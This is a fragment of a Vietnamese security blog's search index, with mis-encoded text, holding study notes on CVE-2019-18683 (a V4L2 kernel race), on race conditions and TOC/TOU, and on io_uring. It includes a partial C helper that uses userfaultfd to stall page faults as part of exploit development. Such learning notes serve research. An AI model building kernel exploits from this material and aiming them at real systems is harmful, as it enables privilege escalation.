h∆∞·ªüng t·ªõi vi·ªác khai th√°c C√≥ m·ªët s·ªë t√≠nh nƒÉng c·ªßa kernel c√≥ th·ªÉ ·∫£nh h∆∞·ªüng t·ªõi vi·ªác khai th√°c c·ªßa ch√∫ng ta:\n Thi·∫øt l·∫≠p /proc/sys/vm/unprivileged_userfaultfd v√™ 0 s·∫Ω kh√¥ng cho ph√©p payload ƒë∆∞·ª£c l∆∞u trong kernel. Vi·ªác n√†y g√¢y ra h·∫°n ch·∫ø, userfaultfd() ch·ªâ ho·∫°t ƒë·ªông b·ªüi privileged users (v·ªõi SYS_CAP_PTRACE capability). Thi·∫øt l·∫≠p kernel.dmesg_restrict sysctl v·ªÅ 1 s·∫Ω ch·∫∑n r√≤ r·ªâ th√¥ng tin qua kernel log. VI·ªác n√†y h·∫°n ch·∫ø ng∆∞·ªùi d√πng ƒë·ªçc th√¥ng tin t·ª´ kerbel syslog qua dmesg. Tuy nhi√™n, d√π cho kernel.dmesg_restrict = 1. Ng∆∞·ªùi d√πng Ubuntu t·ª´ group adm v·∫´n c√≥ th·ªÉ ƒë·ªçc kernel log t·ª´ /var/log/syslog. B·∫£n v√° c·ªßa grsecurity/PaX c√≥ m·ªôt t√≠nh nƒÉng g·ªçi l√† PAX_RANDKSTACK l√†m kh√≥ khƒÉn cho vi·ªác ƒëo√°n v·ªã tr√≠ c·ªßa vb2_qeue. PAX_RAP t·ª´ b·∫£n v√° c·ªßa grsecurity/PaX c√≥ th·ªÉ ch·∫∑n ROP/JOP chain m√¥ t·∫£ ·ªü tr√™n.  poc detail Ti·∫øp theo ch√∫ng ta ti·∫øn h√†nh vi·∫øt poc ƒë·ªÉ khai th√°c l·ªói tr√™n\nM√¥i tr∆∞·ªùng th·ª±c thi  qemu ubuntu server 18.04.3 How To Install \u0026ldquo;linux-tools-virtual-lts-vivid\u0026rdquo; Package on Ubuntu Trong qu√° tr√¨nh c√†i ƒë·∫∑t v√† ki·ªÉm tra v·ªõi l·ªánh getfacl /dev/video0 c√≥ th·ªÉ b·∫°n s·∫Ω b·ªã l·ªói v√¨ thi√™u th∆∞ m·ª•c dev/video0. B√†i vi·∫øt n√†y gi√∫p t√¥i gi·∫£i quy·∫øt ƒë∆∞·ª£c v·∫•n ƒë·ªÅ n√†y. C√†i ƒë·∫∑t KASAN ƒë·ªÉ debug  Init and start setxattr_userfaltfd_monitor, adjtimex_userfaultfd_monitor  Ch√∫ng ta ti·∫øn h√†nh t·∫°o v√† ch·∫°y setxattr_userfaultfd v√† adjtimex_userfaultfd ƒë·ªÉ gi√°m s√°t v√† x·ª≠ l√≠ l·ªói pagefault  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50  void init_setxattr_userfaultfd(){\rlong uffd; /* userfaultfd file descriptor */\r/* start of region handled by userfaultfd */\runsigned long len; /* Length of region handled by userfaultfd */\rpthread_t thr; /* ID of thread taht handles pagefaults */\rstruct uffdio_api uffdio_api;\rstruct uffdio_register uffdio_register;\rint s;\rprintf(\u0026#34;[+] init_setxattr_userfaultfd\\n\u0026#34;);\rpage_size = sysconf(_SC_PAGE_SIZE);\rprintf(\u0026#34;[*] pagesize = %lf\\n\u0026#34;, page_size);\rpthread_t thr2[100] = { 0 };\rlen = 4 * page_size;\r/* Create and enable userfaultfd object */\ruffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);\rif (uffd == -1)\rerr_exit(\u0026#34;userfaultfd\u0026#34;);\ruffdio_api.api = UFFD_API;\ruffdio_api.features = 0;\rif (ioctl(uffd, UFFDIO_API, \u0026amp;uffdio_api) == -1)\rerr_exit(\u0026#34;ioctl-UFFDIO_API\u0026#34;);\r/* Create a private anonymous mapping. The memory will be\rdemand-zero paged--that is, not yet allocated. When we\ractually touch the memory, it will be allocated via the userfaultfd. */\rxattr_addr = mmap(NULL, len, PROT_READ | PROT_WRITE,\rMAP_PRIVATE | MAP_ANONYMOUS, -1, 0);\rprintf(\u0026#34;[+] The sexattr_addr anonymous page_addr: %p\\n\u0026#34;, xattr_addr);\rif (xattr_addr == MAP_FAILED)\rerr_exit(\u0026#34;mmap\u0026#34;);\ruffdio_register.range.start = (unsigned long)xattr_addr + 2 * page_size;\ruffdio_register.range.len = 2*page_size;\ruffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;\rif (ioctl(uffd, UFFDIO_REGISTER, \u0026amp;uffdio_register) == -1)\rerr_exit(\u0026#34;ioctl-UFFDIO_REGISTER\u0026#34;);\r/* Create a thread that will process the userfaultfd events */\rs = pthread_create(\u0026amp;thr, NULL, fault_handler_thread, (void*)uffd);\rif (s != 0){\rerrno = s;\rerr_exit(\u0026#34;pthread_create\u0026#34;);\r}\r}\r  Trong h√†m n√†y, t√¥i ch√∫ √Ω t·ªõi m·ªôt s·ªë ƒëi·ªÉm - nh·ªØng ƒëi·ªÉm n√†y ƒë·ªëi v·ªõi t√¥i ·ªü th·ªùi ƒëi·ªÉm hi·ªán t·∫°i ƒë·ªçc kh√¥ng hi·ªÉu / ch∆∞a hi·ªÉu r√µ:\n H√†m sysconf(_SC_PAGE_SIZE):  Ngu·ªìn tham kh·∫£o  https://www.programmersought.com/article/80733633259/ https://zoomadmin.com/HowToInstall/UbuntuPackage/linux-tools-virtual-lts-vivid https://www.anquanke.com/post/id/200029  ","description":"Khai th√°c l·ªó h·ªïng nh√¢n Linux trong h·ªá th·ªëng con V4L2 (ch∆∞a xong)","id":7,"section":"posts","tags":["cve, linux kernel, V4l2"],"title":"T√¨m hi·ªÉu v·ªÅ CVE-2019-18683","uri":"https://minhlongmt183.github.io/posts/cve-2019-18683/"},{"content":"B√†i vi·∫øt n√†y nh·∫±m m·ª•c ƒë√≠ch ghi l·∫°i nh·ªØng ki·∫øn th·ª©c ƒë√£ h·ªçc ƒë·ªÉ nh·ªõ v√† hi·ªÉu r√µ h∆°n. B√†i vi·∫øt tham kh·∫£o ch·ªß y·∫øu t·ª´ Winning the race: Signals, symlinks, and TOC/TOU\r Gi·ªõi thi·ªáu  Kh√¥ng ph·∫£i t·∫•t c·∫£ race condition ƒë·ªÅu l√† l·ªó h·ªïng, nh·ªØng ph·∫ßn l·ªõn c√°c race condition s·∫Ω d·∫´n t·ªõi l·ªó h·ªïng ·ªü m·ªôt n∆°i n√†o ƒë√≥. N√≥i c√°ch kh√°c, nh·ªØng l·ªó h·ªïng h√¨nh th√†nh do race condition th∆∞·ªùng l√† nh·ªØng l·ªó h·ªïng c·ª±c k√¨ nghi√™m tr·ªçng. Trong l·∫≠p tr√¨nh ƒëa lu·ªìng, race conditions kh√¥ng ph·∫£i l√† vi·ªác xu·∫•t hi·ªán v·∫•n ƒë·ªÅ v√† ta khai th√°c, n√≥ ch·ªâ l√† vi·ªác lu·ªìng th·ª±c thi kh√¥ng gi·ªëng nh∆∞ ch√∫ng ta k√¨ v·ªçng. Bugs c√≥ th·ªÉ t·ªìn t·∫°i ·ªü m·ªçi n∆°i, t·ª´ nh·ªØng ·ª©ng d·ª•ng Linux ·ªü c·∫•p th·∫•p cho ƒë·∫øn tri·ªÉn khai DBMS quan h·ªá ƒëa lu·ªìng.  Race conditions l√† g√¨?  H√£y t∆∞·ªüng t∆∞·ª£ng b·∫°n ƒëang tham gia cu·ªôc thi ch·∫°y ƒëi·ªÅn kinh v√† ƒë·ªëi th·ªß c·ªßa b·∫°n l·∫°i l√† ch·ªã Nguy·ªÖn Thi Th√∫y Hi·ªÅn. V√¨ ƒë√£ r·∫•t n·ªó l·ª±c, b·∫°n v√† ch·ªã Hi·ªÅn ngang t√†i ngang s·ª©c v√† c≈©ng b∆∞·ªõc v√†o giai ƒëo·∫°n n∆∞·ªõc r√∫t v·ªÅ ƒë√≠ch. Th·∫≠t b·∫•t ng·ªù, c·∫£ 2 c√πng ch·∫°m ƒë√≠ch c√πng m·ªôt l√∫c, h·ªá th·ªëng cho th·∫•y c·∫£ 2 ch·∫°m v·∫°ch ƒë√≠ch c√πng th·ªùi ƒëi·ªÉm ƒë·∫øn h√†ng nano gi√¢y. N·∫øu ch·ªâ ch·ªçn 1 qu√°n qu√¢n v·∫≠y ai s·∫Ω l√† qu√°n qu√¢n? B·∫°n ? Hay ch·ªã Hi·ªÅn? Hay c·∫£ 2 (vi·ªác n√†y s·∫Ω l√†m gi·∫£m gi√° tr·ªã c·ªßa ch·ª©c qu√°n qu√¢n)? Hay ch·∫≥ng ai c·∫£? t·ªï ch·ª©c thi ƒë·∫•u l·∫°i? M·ªçi kh·∫£ nƒÉng ƒë·ªÅu c√≥ th·ªÉ x·∫£y ra v√† ch·∫≥ng ai bi·∫øt kh·∫£ nƒÉng n√†o s·∫Ω x·∫£y ra. Race condition trong tr∆∞·ªùng h·ª£p n√†y c≈©ng t∆∞∆°ng t·ª± nh∆∞ v·∫≠y. Race conditions l√† m·ªôt ch·ªß ƒë·ªÅ c·ª±c k√¨ l·ªõn, v·ªõi nhi·ªÅu h√†m √Ω b·∫£o m·∫≠t kh√°c nhau, t·ª´ h√†nh vi kh√¥ng d·ª± ƒëo√°n tr∆∞·ªõc ƒë∆∞·ª£c, kh√¥ng c√≥ v·∫ª nguy hi·ªÉm g√¨ cho ƒë·∫øn s·ª± c·ªë m√°y ch·ªß, chi·∫øm quy·ªÅn ƒëi·ªÅu khi·ªÉn b·∫±ng th·ª±c thi d√≤ng l·ªánh t·ª´ xa. N√≥ b·∫Øt ngu·ªìn t·ª´ vi·ªác l·∫≠p tr√¨nh vi√™n gi·∫£ s·ª≠ ch∆∞∆°ng tr√¨nh c·ªßa m√¨nh ƒëang ch·∫°y tuy·∫øn t√≠nh ho·∫∑c ƒëang ch·∫°y song song nh∆∞ng kh√¥ng xem x√©t tri·ªát ƒë·ªÉ, an to√†n. Ch∆∞∆°ng tr√¨nh c·ªßa h·ªç c√≥ th·ªÉ ho√†n h·∫£o khi ch·∫°y 1 ho·∫°t ƒë·ªông (operation), nh·ªØng khi ch·∫°y 2 hay nhi·ªÅu operations tr√™n nhi·ªÅu process kh√°c nhau, n√≥ c√≥ th·ªÉ d·∫´n t·ªõi lu·ªìng th·ª±c thi b·ªã thay ƒë·ªïi, d·∫´n t·ªõi k·∫øt qu·∫£ kh√¥ng mong mu·ªën ƒë·ªëi v·ªõi victim (ho·∫∑c mong mu·ªën - ƒë·ªëi v·ªõi attacker). Race conditons kh√¥ng ph·∫£i lu√¥n l√† l·ªó h·ªïng b·∫£o m·∫≠t v√¨ m·ªôt s·ªë tr∆∞·ªùng h·ª£p, nh·ªØng h√†nh vi kh√¥ng mong mu·ªën ƒë∆∞·ª£c ph√°t sinh n√†y kh√¥ng mang l·∫°i nguy hi·ªÉm n√†o ƒë·ªëi v·ªõi h·ªá th·ªëng c·∫£. Race conditons c√≥ th·ªÉ xu·∫•t hi·ªán ·ªü nhi·ªÅu ng·ªØ c·∫£nh, th·∫≠m ch√≠ t·ªìn t·∫°i ngay trong nh·ªØng thi·∫øt b·ªã ƒëi·ªán t·ª≠ c∆° b·∫£n (c·∫£ ƒëi·ªán sinh h·ªçc. Race condtions ƒë√£ t√¨m th·∫•y b√™n trong n√£o c·ªßa chu·ªôt s·ªëng). Ti·ªÅn ƒë·ªÅ c∆° b·∫£n cho race conditions l√† 2 thread ch·ªëng l·∫°i nhau ƒë·ªÉ t√¨m ng∆∞·ªùi th·∫Øng cu·ªôc. Ng∆∞·ªùi th·∫Øng c√≥ quy·ªÅn thao t√∫ng lu·ªìng th·ª±c thi c·ªßa ·ª©ng d·ª•ng.  1 2 3 4 5 6 7 8 9 10 11 12  #include \u0026lt;stdio.h\u0026gt;\r#include \u0026lt;signal.h\u0026gt; // keep an eye out for this header especially\r#include \u0026lt;race_conditon.h\u0026gt;\r\rint main(void){\rif (something == permitted){\rdoThis();\r}\relse {\rprintf(\u0026#34;lolnope\\n\u0026#34;);\r}\r}\r   Th√¥ng th∆∞·ªùng, race conditons c√≥ xu h∆∞·ªõng xu·∫•t hi·ªán trong nh·ªØng ·ª©ng d·ª•ng vi·∫øt b·∫±ng C. ƒê·∫∑c bi·ªát trong nh·ªØng ch∆∞∆°ng tr√¨nh c√≥ s·ª≠ d·ª•ng th∆∞ vi·ªán signal.h v√¨ header n√†y xu·∫•t hi·ªán d·ª± b√°o r·∫±ng ch∆∞∆°ng tr√¨nh s·∫Ω c√≥ nh·ªØng race t√¨m ·∫©n ƒë·ªÉ d·∫´n t·ªõi s·ªë l∆∞·ª£ng t√≠n hi·ªáu x·ª≠ l√≠ l√† √≠t nh·∫•t. M·∫∑t kh√°c, n·∫øu ki·ªÉm tra quy·ªÅn c·ªßa c√°c t·ªáp c√≥ xu·∫•t hi·ªán c√°c symlink races c≈©ng cho th·∫•y c√≥ nguy c∆° v·ªÅ race condition. ƒêo·∫°n code tr√™n ch·ªâ l√† m√£ gi·∫£, n√≥ s·∫Ω kh√¥ng ch·∫°y, m·ª•c ƒë√≠ch c·ªßa ƒëo·∫°n m√£ gi·∫£ nh·∫±m gi√∫p ch√∫ng ta c√≥ c√°i nh√¨n tr·ª±c quan h∆°n v·ªÅ ki·ªÉu t·∫•n c√¥ng d·ª±a tr√™n race condition. G·ªâa s·ª≠ attacker g·ª≠i hai operations t·ªõi ch∆∞∆°ng tr√¨nh t·∫°i c√πng th·ªùi ƒëi·ªÉm, c√πng 1 tr·∫°ng th√°i tr√™n lu·ªìng m√£ th·ª±c thi (n·∫øu ƒë∆∞·ª£c). N·∫øu nh∆∞ th·ªùi gian ch√≠nh x√°c, attacker c√≥ th·ªÉ cho ph√©p m·ªôt bi·∫øn n√†o ƒë√≥ ƒë√∫ng / ho·∫∑c sai t·∫°i m·ªôt th·ªùi ƒëi·ªÉm ki·ªÉm tra, nh∆∞ng bi·∫øn n√†y kh√¥ng c√≤n ƒë∆∞·ª£c s·ª≠ d·ª•ng t·∫°i th·ªùi ƒëi·ªÉm ƒë√≥. (N√†y ƒë∆∞·ª£c g·ªçi l√† TOC/TOU race c√≥ nghƒ©a l√† Time of Check, Time of Use)\nGi·∫£ s·ª≠, ch√∫ng ta th·ª±c hi·ªán l·ªánh  1  if (something_is_permitted) // check if permitted\r  N·∫øu ƒëi·ªÅu ki·ªán ƒë√∫ng th√¨ n√≥ s·∫Ω th·ª±c thi doThis() gi·ªëng nh∆∞ k√¨ v·ªçng c·ªßa t√°c gi·∫£, tuy nhi√™n n·∫øu somethig_is_not_permitted m√† h√†m if n√†y v·∫´n ch·∫•p nh·∫≠n th√¨ khi th·ª±c hi·ªán doThis() s·∫Ω c√≥ nguy c∆° ph√°t sinh nh·ªØng tr∆∞·ªùng h·ª£p kh√¥ng mong mu·ªën, v√† tuy theo m√£ sau ƒë√≥ th·∫ø n√†o m√† attacker c√≥ th·ªÉ bypass access controls, escalate privileges, cause a denial of service\n Khi n√≥i v·ªÅ Race Conditions, m·ªçi ng∆∞·ªùi th∆∞·ªùng nghƒ© t·ªõi nh·ªØng th·ª© g√¨ ƒë√≥ r·∫•t nhanh, th·ªùi gian ph·∫£i c·ª±c k√¨ ch√≠nh x√°c ƒë·ªÉ c√≥ th·ªÉ th·ª±c thi TOC/TOU race. ƒêi·ªÅu n√†y kh√¥ng sai, tuy nhi√™n kh√¥ng ph·∫£i l√∫c n√†o c≈©ng v·∫≠y. C√πng xem x√©t v√≠ d·ª• v·ªÅ l·ªói `slow-paced\u0026rdquo; race condition:  C√≥ m·ªôt ·ª©ng d·ª•ng m·∫°ng x√£ h·ªôi, ng∆∞·ªùi d·ª´ng c√≥ th·ªÉ s·ª≠ ƒë·ªïi th√¥ng tin c·ªßa h·ªç. M·ªôt user click v√†o n√∫t \u0026ldquo;edit profile\u0026rdquo;, ·ª©ng d·ª•ng m·ªü ra m·ªôt trang web cho ph√©p h·ªç th·ª±c hi·ªán s·ª≠a ƒë·ªïi. User ti·∫øn h√†nh s·ª≠ ƒë·ªïi b·∫±ng b√†n ph√≠m (go AFK - Away from Keyboard). Qu·∫£n tr·ªã vi√™n nh√¨n th·∫•y nh·ªØng l·ªói kh√¥ng mong mu·ªën trong ch·ª©c nƒÉng s·ª≠a ƒë·ªïi th√¥ng tin tr√™n website, n√™n quy·∫øt ƒë·ªãnh t·∫Øt ch·ª©c nƒÉng n√†y. Do ƒë√≥, user kh√¥ng th·ªÉ d√πng n√≥ ƒë·ªÉ s·ª≠a th√¥ng tin c·ªßa h·ªç. Quay l·∫°i v·ªõi user tr√™n, anh ta v·∫´n c√≤n ƒëang ·ªü trong trang web cho vi·ªác s·ª≠a ƒë·ªïi th√¥ng tin. M·∫∑c d√π new user kh√¥ng th·ªÉ truy c·∫≠p v√†o trang \u0026ldquo;edit profile\u0026rdquo;, nh∆∞ng user n√†y v·∫´n c√≤n trang web cho vi·ªác s·ª≠a ƒë·ªïi th√¥ng tin n√™n anh ta v·∫´n c√≥ th·ªÉ ti·∫øp t·ª•c s·ª≠a ƒë·ªïi, m·∫∑c d√π ch·ª©c nƒÉng n√†y ƒë√£ b·ªã qu·∫£n tr·ªã vi√™n t·∫Øt.   Race conditons c√≥ th·ªÉ ƒë∆∞·ª£c g√¢y ra do ƒë·ªô tr·ªÖ trong networks. Gi·∫£ s·ª≠ c√≥ m·ªôt hub v√† 2 linked nodes. Bob mu·ªën ƒëƒÉng k√≠ m·ªôt channel #hax v√† Alice c≈©ng muosn ƒëƒÉng k√≠ c√πng chanel n√†y. Xem x√©t tr∆∞·ªùng h·ª£p sau:  Bob k·∫øt n·ªëi t·ªõi IRC t·ª´ node #1 Alice k·∫øt n·ªëi t·ªõi IRC t·ª´ node #2 Bob ch·∫°y /join #hax Alice ch·∫°y /join #hax C·∫£ hai c√¢u l·ªánh ƒë·ªÅu ƒë∆∞·ª£c th·ª±c hi·ªán t·ª´u 2 node kh√°c nhau, c√πng 1 th·ªùi ƒëi·ªÉm. Bob tr·ªü th√†nh ng∆∞·ªùi ƒëi·ªÅu h√†nh c·ªßa #hax. Alic tr·ªü th√†nh ng∆∞·ªùi ƒëi·ªÅu h√†nh c·ªßa #hax. Nguy√™n nh√¢n cho tr∆∞·ªùng h·ª£p n√†y b·ªüi v√¨ ƒë·ªô tr·ªÖ m·∫°ng, node #1 s·∫Ω c√≥ th·ªùi gian g·ª≠i t√≠n hi·ªáu t·ªõi node #2 ƒë·ªÉ c·∫£nh b√°o r·∫±ng Services Daemon ƒë√£ b·ªã ng∆∞·ªùi kh√°c n·∫Øm gi·ªØ tr√™n c√πng network.    (PROTIP: When testing local desktop applications for Race Conditions - for example a compiled binary - use something like GDB or OllyDBG to set a breakpoint between TOC and TOU within the source code of the binary you are debugging. Execute your code from the breakpoint and take note of the results in order to determine any potential security risk or lack thereof. This is for confirmation of the bug only, and not for actual exploitation. As the saying goes, PoC||GTFO. This rings especially true with race conditions considering some of them are just bugs or glitches or whatever you wanna call them, as opposed to viable exploits with real attack value. If you cannot demonstrate impact, you probably should not report it)\r ","description":"Trong qu√° tr√¨nh reproduce CVE-2019-18683, t√¥i nh·∫≠n ra hi·ªÉu bi·∫øt c·ªßa m√¨nh v·ªÅ race condtion qu√° √≠t v√† h·∫°n h·∫πp, b√†i vi·∫øt n√†y v·ªõi m·ª•c ƒë√≠ch note l·∫°i nh·ªØng ki·∫øn th·ª©c li√™n quan v·ªÅ race condtion","id":8,"section":"posts","tags":["cve, linux kernel, race condition"],"title":"Wining the racing","uri":"https://minhlongmt183.github.io/posts/wining_the_racing/"},{"content":"B√†i vi·∫øt n√†y nh·∫±m m·ª•c ƒë√≠ch ghi l·∫°i nh·ªØng ki·∫øn th·ª©c ƒë√£ h·ªçc ƒë·ªÉ nh·ªõ v√† hi·ªÉu r√µ h∆°n. B√†i vi·∫øt tham kh·∫£o ch·ªß y·∫øu t·ª´ CVE-2021‚Äì20226 a reference counting bug which leads to local privilege escalation in io_uring.\r ƒê√¥i n√©t v·ªÅ io_uring io_uring Asynchronous I/O (AIO) framework l√† m·ªôt giao di·ªán I/O m·ªõi cho Linux, ƒë∆∞·ª£c gi·ªõi thi·ªáu tr√™n linux kernel version 5.1 (th√°ng 3 - 2019).\nCommunication channel From: https://flattsecurity.medium.com/cve-2021-20226-a-reference-counting-bug-which-leads-to-local-privilege-escalation-in-io-uring-e946bd69177a\n io_uring instance c√≥ 2 v√≤ng, submission queue (SQ) v√† completion queue (CQ) ƒë∆∞·ª£c chia s·∫ª gi·ªØa kernel v√† ·ª©ng d·ª•ng. Nh·ªØng h√†ng ƒë·ª£i: single producer, single consumer cung c·∫•p 1 giao di·ªán √≠t kh√≥a, v√† ƒë∆∞·ª£c ph·ªëi h·ª£p v·ªõi r√†o c·∫£n b·ªô nh·ªõ (memory barrier). Application s·∫Ω t·∫°o m·ªôt ho·∫∑c nhi·ªÅu SQ entry (SQE) v√† s·∫Ω c·∫≠p nh·∫≠t v√†o ƒëu√¥i c·ªßa h√†ng ƒë·ª£i SQ. Kernel c≈©ng s·ª≠ d·ª•ng SQE, n√≥ s·∫Ω c·∫≠p nh·∫≠t v√†o ƒë·∫ßu c·ªßa h√†ng ƒë·ª£i SQ. Kernel s·∫Ω t·∫°o m·ªôt ho·∫∑c nhi·ªÅu CQ entry (CQE) v√† s·∫Ω c·∫≠p nh·∫≠t v√†o ƒëu√¥i c·ªßa h√†ng ƒë·ª£i CQ. Application c≈©ng s·ª≠ d·ª•ng th·∫±ng CQE n√†y v√† c·∫≠p nh·∫≠t t·ª´ ƒë·∫ßu c·ªßa h√†ng ƒë·ª£i CQ.  Systemcall API io_uring API g·ªìm 3 system call ch√≠nh bao g·ªìm: io_uring_setup, io_uring_register, io_uring_enter\nio_uring_setup Thi·∫øt l·∫≠p m·ªôt ng·ªØ c·∫£nh ƒë·ªÉ th·ª±c hi·ªán ch·∫°y IO b·∫•t ƒë·ªìng b·ªô.\n1  int io_uring_setup(u32 entries, struct io_uring_params *p);\r  L·ªánh n√†y s·∫Ω ti·∫øn h√†nh thi·∫øt l·∫≠p 2 h√†ng ƒë·ª£i submission queue v√† completion queue v·ªõi s·ªë l∆∞·ª£ng c√°c ph·∫ßn t·ª≠ entries √≠t nh·∫•t. Tr·∫£ v·ªÅ m·ªôt file description ƒë·ªÉ th·ª±c hi·ªán c√°c ho·∫°t ƒë·ªông ti·∫øp theo tr√™n phi√™n b·∫£n io_uring. 2 h√†ng ƒë·ª£i n√†y ƒë∆∞·ª£c chia s·∫ª gi·ªØa kernel v√† application, gi√∫p gi·∫£m chi ph√≠ khi d·ªØ li·ªáu giao ti·∫øp gi·ªØa 2 b√™n (ko c·∫ßn ph·∫£i sao ch√©p) khi kh·ªüi t·∫°o v√† th·ª±c thi I/O.\nNh·ªØng tham s·ªë ƒë∆∞·ª£c s·ª≠ d·ª•ng b·ªüi application ƒë·ªÉ c·∫•u h√¨nh cho io_uring instance v√† kernel s·∫Ω tr·∫£ l·∫°i th√¥ng tin v·ªÅ c·∫•u h√¨nh ƒë·∫øn 2 h√†ng v√≤ng buffer.\nio_uring instance c√≥ th·ªÉ ƒë∆∞·ª£c c·∫•u h√¨nh ·ªü 3 ch·∫ø ƒë·ªô ho·∫°t ƒë·ªông ch√≠nh:\n Interrupt driven M·∫∑c ƒë·ªãnh, io_uring instance s·∫Ω ƒë∆∞·ª£c thi·∫øt l·∫≠p ƒë·ªÉ ƒëi·ªÅu khi·ªÉn IO khi l·ªói, IO c√≥ th·ªÉ ƒë∆∞·ª£c g·ª≠i b·∫±ng io_uring_enter() v√† ƒë∆∞·ª£c l·∫•y tr·ª±c ti·∫øp t·ª´ completion queue. Polled: th·ª±c hi·ªán ch·∫ø ƒë·ªô ch·ªù I/O ho√†n th√†nh. File h·ªá th·ªëng v√† nh·ªØng thi·∫øt b·ªã kh·ªëi (block device) c·∫ßn ph·∫£i ƒë∆∞·ª£c h·ªó tr·ª£ m·ªõi s·ª≠ d·ª•ng t√≠nh nƒÉng n√†y. T√≠nh nƒÉng n√†y gi√∫p gi·∫£m thi·ªÉu ƒë·ªô tr·ªÖ khi th·ª±c hi·ªán IO, tuy nhi√™n n√≥ l·∫°i t·ªën nhi·ªÅu resource c·ªßa CPU h∆°n vi·ªác th·ª±c hi·ªán Interrupt. Hi·ªán nay, t√≠nh nƒÉng n√†y ch·ªâ th·ª±c hi·ªán v·ªõi nh·ªØng file descriptor ƒë∆∞·ª£c m·ªü k√®m v·ªõi c·ªù O_DIRECT.\nKhi ƒë·ªçc ho·∫∑c vi·∫øt v√†o ng·ªØ c·∫£nh ƒë√£ thi·∫øt l·∫≠p poll th√¨ ·ª©ng d·ª•ng ph·∫£i ti·∫øn h√†nh xem t√¨nh tr·∫°ng ho√†n th√†nh tr√™n CQ ring b·∫±ng l·ªánh io_uring_enter(). Vi·ªác tr·ªôn v√† k·∫øt h·ª£p I / O ƒë√£ ƒë∆∞·ª£c thƒÉm d√≤ v√† kh√¥ng ƒë∆∞·ª£c thƒÉm d√≤ tr√™n m·ªôt phi√™n b·∫£n io_uring l√† ko ƒë∆∞·ª£c ph√©p. Kernel polled: Trong ch·∫ø ƒë·ªô n√†y, kernel thread ƒë∆∞·ª£c t·∫°o ƒë·ªÉ thƒÉm d√≤ h√†ng ƒë·ª£i g·ª≠i (submission queue). M·ªôt io_uring instanceƒë∆∞·ª£c c·∫•u h√¨nh theo c√°ch n√†y cho ph√©p ·ª©ng d·ª•ng x·ª≠ l√≠ I/O m√† kh√¥ng c·∫ßn xu·ªëng kernel. B·∫±ng vi·ªác d√πng submisstion queue ƒë·ªÉ ƒëi·ªÅn nh·ªØng SQE m·ªõi v√† ki·ªÉm tra t√¨nh tr·∫°ng ho√†n th√†nh tr√™n completion queue, ·ª©ng d·ª•ng c√≥ th·ªÉ submit v√† l·∫•y k·∫øt qu·∫£ I/O m√† kh√¥ng c·∫ßn th·ª±c hi·ªán system call.\nTr∆∞·ªùng h·ª£p kernel r·∫£nh r·ªói h∆°n t·ªïng th·ªùi gian ng∆∞·ªùi d√πng c·∫•u h√¨nh, n√≥ s·∫Ω ti·∫øp t·ª•c nh√†n r·ªói ƒë·∫øn khi nh·∫≠n ƒë∆∞·ª£c th√¥ng b√°o t·ª´ ·ª©ng d·ª•ng. Trong tr∆∞·ªùng h·ª£p n√†y, ·ª©ng d·ª•ng g·ªçi l·ªánh io_uring_enter() ƒë·ªÉ ti·∫øn h√†nh ƒë√°nh th·ª©c kernel.\nio_uring_setup() s·∫Ω tr·∫£ v·ªÅ m·ªôt fd (file descripton), gi√° tr·ªã n√†y ƒë∆∞·ª£c s·ª≠ d·ª•ng cho mmap ƒë·ªÉ t·∫°o 2 h√†ng ƒë·ª£i SQ v√† CQ, v√† c√≥ th·ªÉ ƒë∆∞·ª£c s·ª≠ d·ª•ng b·ªüi 2 system call io_uring_register() v√† io_uring_enter()  io_uring_register Nh·ªØng file ƒë∆∞·ª£c ƒëƒÉng k√≠ ho·∫∑c user buffer ch·∫°y IO b·∫•t ƒë·ªìng b·ªô.\n1  int io_uring_register(unsigned int fd, unsigned int opcode, void *arg, unsigned int nr_args);\r   ƒê∆∞·ª£c s·ª≠ d·ª•ng cho th·ª±c th·ªÉ io_uring ƒë∆∞·ª£c tr·ªè b·ªüi fd. Vi·ªác ƒëƒÉng k√≠ n√†y gi√∫p kernel thread c√≥ th·ªùi gian tham chi·∫øu t·ªõi c·∫•u tr√∫c d·ªØ li·ªáu b√™n trong kernel li√™n k·∫øt v·ªõi t·ªáp l√¢u h∆°n, ho·∫∑c t·∫°o √°nh x·∫° c·ªßa t·ª´ng v√πng nh·ªõ c·ª• th·ªÉ tr√™n ·ª©ng d·ª•ng v·ªõi buffer l√¢u h∆°n. Ch√∫ng ta ch·ªâ c·∫ßn ƒëƒÉng k√≠ 1 l·∫ßn thay v√¨ ph·∫£i th·ª±c hi·ªán nhi·ªÅu l·∫ßn trong qu√° tr√¨nh x·ª≠ l√≠, vi·ªác n√†y gi√∫p gi·∫£m overhead tr√™n IO trong x·ª≠ l√≠. Nh·ªØng buffer ƒë∆∞·ª£c ƒëƒÉng k√≠ s·∫Ω b·ªã kh√≥a tr√™n memory v√† s·∫Ω b·ªã \u0026ldquo;t√≠nh ph√≠\u0026rdquo; theo gi·ªõi h·∫°n RLIMIT_MEMLOCK c·ªßa ng∆∞·ªùi d√πng. Th∆∞·ªùng gi·ªõi h·∫°n n√†y s·∫Ω l√† 1GB/buffer. Hi·ªán t·∫°i, b·ªô nh·ªõ ƒë·ªám ph·∫£i ·∫©n danh (ANONYMOUS) v√† kh√¥ng ƒë∆∞·ª£c sao l∆∞u b·∫±ng t·ªáp. C√≥ th·ªÉ thi·∫øt l·∫≠p 1 v√πng ƒë·ªám l·ªõn r·ªìi ch·ªçn 1 ph·∫ßn nh·ªè cho I/O, mi·ªÖn ph·∫ßn nh·ªè ƒë√≥ n·∫±m trong v√πng ƒë∆∞·ª£c √°nh x·∫°. ·ª®ng d·ª•ng c√≥ th·ªÉ tƒÉng, gi·∫£m k√≠ch th∆∞·ªõc ho·∫∑c s·ªë l∆∞·ª£ng buffer ƒë√£ ƒëƒÉng k√≠ b·∫±ng c√°ch h·ªßy ƒëƒÉng k√≠ buffer hi·ªán t·∫°i v√† ƒëƒÉng k√≠ buffer m·ªõi v·ªõi l·ªánh io_uring_register(). M·ªôt ·ª©ng d·ª•ng c√≥ th·ªÉ c·∫≠p nh·∫≠t ƒë·ªông t·∫≠p c√°c file ƒë√£ ƒëƒÉng k√≠ m√† kh√¥ng c·∫ßn h·ªßy ƒëƒÉng k√≠ ch√∫ng. C√≥ th·ªÉ s·ª≠ d·ª•ng eventfd ƒë·ªÉ nh·∫≠n th√¥ng b√°o v·ªÅ c√°c s·ª± ki·ªán 